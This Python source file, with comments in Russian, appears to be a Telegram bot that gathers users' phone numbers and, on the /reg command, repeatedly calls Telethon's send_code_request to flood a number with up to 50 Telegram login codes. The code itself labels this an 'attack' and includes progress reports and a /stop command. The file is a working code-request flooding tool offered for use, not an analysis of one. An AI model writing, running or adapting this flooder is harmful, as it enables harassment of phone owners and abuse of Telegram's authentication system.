import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from aiogram import types
from database import save_phone_number, get_phone_number
from config import API_ID, API_HASH

user_phones = {}
active_attacks = {}  # {user_id: {'active': True, 'task': None}}

def get_contact_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    return kb

async def start_handler(message: types.Message):
    print(f"[DEBUG] start_handler вызван для {message.from_user.id}")
    user_id = message.from_user.id
    bot = message.bot
    
    phone = get_phone_number(user_id)
    if phone:
        user_phones[user_id] = phone
        await send_code(user_id, bot, phone)
        await message.answer("🔐 Код подтверждения отправлен на твой номер!\n\nЧтобы остановить атаку - напиши /stop")
    else:
        await message.answer("📱 Отправь свой номер телефона:", reply_markup=get_contact_keyboard())

async def reg_handler(message: types.Message):
    print(f"[DEBUG] reg_handler вызван для {message.from_user.id}")
    user_id = message.from_user.id
    bot = message.bot
    
    phone = get_phone_number(user_id)
    if not phone:
        await message.answer("❌ Сначала пройди регистрацию через /start")
        return
    
    # Останавливаем предыдущую атаку если была
    if user_id in active_attacks:
        active_attacks[user_id]['active'] = False
        await asyncio.sleep(0.5)
    
    active_attacks[user_id] = {'active': True}
    
    await message.answer("🔄 Начинаю отправку кодов... (напиши /stop чтобы остановить)")
    
    for i in range(50):  # 50 кодов максимум
        if not active_attacks.get(user_id, {}).get('active', True):
            await message.answer(f"⏹️ Атака остановлена! Отправлено {i} кодов.")
            break
        
        await send_code(user_id, bot, phone)
        await asyncio.sleep(1.5)
        
        if i % 5 == 0 and i > 0:
            await message.answer(f"📊 Отправлено {i} кодов... (пиши /stop чтобы остановить)")
    
    if active_attacks.get(user_id, {}).get('active', False):
        await message.answer(f"✅ Отправлено 50 кодов на номер {phone}")
    
    if user_id in active_attacks:
        del active_attacks[user_id]

async def stop_handler(message: types.Message):
    """Команда /stop - останавливает текущую атаку"""
    user_id = message.from_user.id
    bot = message.bot
    
    if user_id in active_attacks:
        active_attacks[user_id]['active'] = False
        await message.answer("⏹️ Атака остановлена по команде /stop")
        print(f"[DEBUG] Атака остановлена для {user_id}")
    else:
        await message.answer("ℹ️ Нет активной атаки. Напиши /reg чтобы начать.")

async def contact_handler(message: types.Message):
    print(f"[DEBUG] contact_handler вызван для {message.from_user.id}")
    if message.contact:
        phone = message.contact.phone_number
        user_id = message.from_user.id
        bot = message.bot
        
        save_phone_number(user_id, phone)
        user_phones[user_id] = phone
        
        await message.answer("✅ Номер принят!", reply_markup=types.ReplyKeyboardRemove())
        await send_code(user_id, bot, phone)
        await message.answer("🔐 Код подтверждения отправлен!\n\nЧтобы отправить много кодов - напиши /reg\nЧтобы остановить - /stop")

async def send_code(user_id, bot, phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.send_code_request(phone)
        print(f"[+] Код отправлен на {phone}")
        return True
    except Exception as e:
        print(f"[-] Ошибка: {e}")
        await bot.send_message(user_id, f"❌ Ошибка: {e}")
        return False
    finally:
        await client.disconnect()
